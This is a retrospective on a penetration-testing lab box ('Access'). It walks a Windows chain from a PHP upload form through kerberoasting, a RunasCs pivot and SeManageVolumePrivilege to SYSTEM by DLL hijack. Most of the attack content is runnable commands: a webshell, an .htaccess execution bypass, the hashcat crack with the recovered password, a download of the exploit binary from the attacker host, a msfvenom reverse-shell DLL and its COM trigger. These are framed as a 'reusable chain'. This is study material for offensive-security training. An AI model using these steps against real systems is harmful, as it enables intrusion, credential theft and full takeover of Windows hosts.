title: Access Retrospective — Windows Web-Upload to SYSTEM
body:
Access (access.offsec) was a web-upload foothold on a DC that walked through a full Windows chain: upload-filter bypass → kerberoast → RunasCs pivot → SeManageVolume → System32 DLL proxy → SYSTEM. Almost every step had a trap that LOOKED like it worked (or should have) and didn't. The lessons are all recognition.

Chain: PHP upload form → filter bypass (.htaccess) → cmd webshell → encoded PS reverse (svc_apache) → beacon → kerberoast svc_mssql → crack → RunasCs as svc_mssql → SeManageVolumePrivilege → write System32 → DLL hijack → SYSTEM.

— SIX LESSONS —

  1. MATCH THE REVERSE SHELL TO THE TARGET OS
     The pentestmonkey PHP reverse shell connected then DIED instantly:
     "'uname' is not recognized". It's LINUX (bash -i, uname) — the target is
     Windows/XAMPP (Apache "(Win64)" right there in the nmap banner). A PHP
     foothold on Windows still needs a WINDOWS payload: a cmd webshell
     (<?php system($_GET['cmd']); ?>) driving an ENCODED PowerShell reverse
     one-liner (encode.py). Read the OS off recon BEFORE picking a payload.

  2. UPLOAD BYPASS: MIDDLE-EXT SERVED STATIC → .htaccess WAS THE ROUTE
     shell.php3.jpg uploaded fine but curl returned the literal <?php source —
     STATIC, PHP never ran. The middle-extension trick only fires on Apache
     wired with AddHandler multi-ext matching; this box wasn't. The win was a
     .htaccess dropped in /uploads/:  AddType application/x-httpd-php .jpg
     — then any .jpg executes as PHP. DIAGNOSE with curl-raw: source back =
     static (stop trying .xxx.jpg variants); code output = executing.

  3. KERBEROAST EVEN WITH ONE SPN
     Rubeus /tgtdeleg found exactly ONE kerberoastable user (svc_mssql) —
     hashcat -m 13100 cracked it to 'trustno1' in seconds. Service accounts
     carry weak, human-set passwords that rockyou eats; regular domain users
     usually don't. One SPN is worth roasting. (Contrast the golden rule for
     NTDS hashes: pass those, don't crack — but roasted TGS hashes you DO crack.)

  4. WINRM FAILED → RunasCs --logon-type 8 MATERIALIZED THE SHELL
     svc_mssql's creds were valid on SMB but WinRM refused (not in Remote
     Management Users). Instead of stalling, RunasCs with --logon-type 8
     (NetworkCleartext) spawned a fresh beacon running AS svc_mssql. When a
     cred won't WinRM, RunasCs logon-type 8/9 turns it into a running token.

  5. SeManageVolumePrivilege IS A FULL-SYSTEM PRIMITIVE
     svc_mssql held SeManageVolumePrivilege — sounds like disk housekeeping,
     ISN'T. SeManageVolumeExploit.exe opened a writable ACL across C:\Windows
     ("Entries changed: 924"), turning "can't touch System32" into "plant any
     DLL". Don't skim past an odd-looking privilege — look it up; several of
     the quiet ones (ManageVolume, Backup, Restore) are SYSTEM in disguise.

  6. THE DLL TRIGGER DECIDES THE CONTEXT YOU LAND IN  (the key recognition)
     With System32 writable, you plant a DLL a privileged process auto-loads.
     But WHICH dll + HOW you trigger it sets your token:
       tzres.dll in wbem\  + `systeminfo`  → NT AUTHORITY\NETWORK SERVICE
         (partial — what the run actually landed; often can't read proof)
       Printconfig.dll in spool\drivers\x64\3\ + PrintNotify COM instantiate
         → NT AUTHORITY\SYSTEM  (full — the reliable finish)
       phoneinfo.dll in System32 + WerTrigger.exe (WerFault triggers it)
         → NT AUTHORITY\SYSTEM  (the OffSec-OFFICIAL Access finish — cleanest)
     Same write primitive, different endgame. If a trigger drops you at
     network service, don't call it done — switch to the Printconfig/
     PrintNotify route for real SYSTEM.

— REUSABLE CHAIN (Windows web-to-SYSTEM) —

  1. upload form + writable /uploads/ → test file, confirm it renders a path
  2. blacklist? → curl-raw to check EXECUTION, not just upload
  3. static? → .htaccess AddType (or an allowed-exec ext) → cmd webshell
  4. OS-matched shell (Windows = encoded PS reverse) → beacon
  5. BloodHound + kerberoast (even 1 SPN) → crack → creds
  6. cred won't WinRM? → RunasCs --logon-type 8 → shell as that user
  7. whoami /priv EVERY new user → SeManageVolume/Backup/Restore = SYSTEM
  8. write System32 → DLL proxy → Printconfig/PrintNotify for SYSTEM
cmd:
# ── ACCESS — Windows web-upload → SYSTEM ──

# 1) FOOTHOLD — upload bypass (diagnose execution with curl-raw)
curl -s 'http://$ip/uploads/shell.php3.jpg?cmd=id'   # source back = STATIC
echo 'AddType application/x-httpd-php .jpg' > .htaccess   # upload to /uploads/
#   then upload shell.jpg (cmd webshell) — now executes as PHP

# 2) OS-MATCHED SHELL — Windows target → encoded PS reverse (NOT pentestmonkey)
python3 encode.py            # paste the -e blob via ?cmd=  → svc_apache

# 3) KERBEROAST (even one SPN)
.\Rubeus.exe kerberoast /tgtdeleg /outfile:tgs.rc4
hashcat -m 13100 tgs.rc4 /usr/share/wordlists/rockyou.txt   # svc_mssql:trustno1

# 4) PIVOT — WinRM refused, RunasCs logon-type 8 spawns a beacon as svc_mssql
execute .\RunasCs.exe svc_mssql trustno1 C:\tmp\beacon.exe --logon-type 8

# 5) PRIV — svc_mssql has SeManageVolumePrivilege → open System32 write
iwr http://$lhost/SeManageVolumeExploit.exe -OutFile C:\Windows\Temp\smv.exe
.\smv.exe ; icacls C:\Windows          # BUILTIN\Users now has write

# 6) SYSTEM — DLL proxy. Printconfig/PrintNotify = SYSTEM (tzres/systeminfo
#    only gives network service — use Printconfig for the real finish):
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$lhost LPORT=443 -f dll -o payload.dll
copy payload.dll C:\Windows\System32\spool\drivers\x64\3\Printconfig.dll
# nc -nlvp 443 ; then:
powershell -c "$t=[Type]::GetTypeFromCLSID('{854A20FB-2D44-457D-992F-EF13785D2B51}');[Activator]::CreateInstance($t)"
#   → nt authority\system → type C:\Users\Administrator\Desktop\proof.txt
warn: Access is a recognition gauntlet — three traps that look like progress but aren't. (1) The pentestmonkey PHP shell is LINUX; on this Windows box it connects and dies — use a Windows payload (encoded PS). (2) shell.php3.jpg uploads but serves STATIC (no AddHandler); curl-raw shows the source — the real route is a .htaccess AddType. (3) The System32 DLL trigger decides your token: tzres+systeminfo = NETWORK SERVICE (what the run got, often not enough), Printconfig+PrintNotify = SYSTEM (the finish). Same write primitive, different endgame — if you land at network service, switch to the Printconfig route. Also: kerberoast even ONE SPN (service accounts crack), and when a cred won't WinRM, RunasCs --logon-type 8 turns it into a shell.
